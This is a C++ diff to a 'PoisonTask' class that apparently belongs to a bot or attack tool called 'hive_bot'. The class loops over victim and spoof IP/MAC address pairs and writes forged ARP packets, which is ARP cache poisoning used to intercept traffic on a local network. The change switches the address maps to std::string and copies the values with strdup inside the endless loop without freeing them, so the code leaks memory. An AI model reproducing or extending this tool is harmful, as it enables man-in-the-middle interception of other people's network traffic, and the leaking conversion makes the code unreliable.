@@ -16,11 +16,11 @@
 
 namespace hive_bot {
 
-PoisonTask::PoisonTask(std::unordered_map<char*, char*> victim_addresses,
-                       std::unordered_map<char*, char*> spoof_addresses,
+PoisonTask::PoisonTask(std::unordered_map<std::string, std::string> v_addresses,
+                       std::unordered_map<std::string, std::string> s_addresses,
                        u_long sleep_duration) {
-  victim_addresses_ = victim_addresses;
-  spoof_addresses_ = spoof_addresses;
+  victim_addresses_ = v_addresses;
+  spoof_addresses_ = s_addresses;
   sleep_duration_ = sleep_duration;
 }
 
@@ -33,10 +33,10 @@ void PoisonTask::Loop() {
   while (running_) {
     for (auto& victim_address : victim_addresses_) {
       for (auto& spoof_address : spoof_addresses_) {
-        char* victim_ip = victim_address.first;
-        char* victim_mac = victim_address.second;
-        char* spoof_ip = spoof_address.first;
-        char* spoof_mac = spoof_address.second;
+        char* victim_ip = strdup(victim_address.first.c_str());
+        char* victim_mac = strdup(victim_address.second.c_str());
+        char* spoof_ip = strdup(spoof_address.first.c_str());
+        char* spoof_mac = strdup(spoof_address.second.c_str());
 
         WriteArp(packet_buffer, victim_mac, spoof_mac, spoof_mac, victim_mac,
                  spoof_ip, victim_ip);
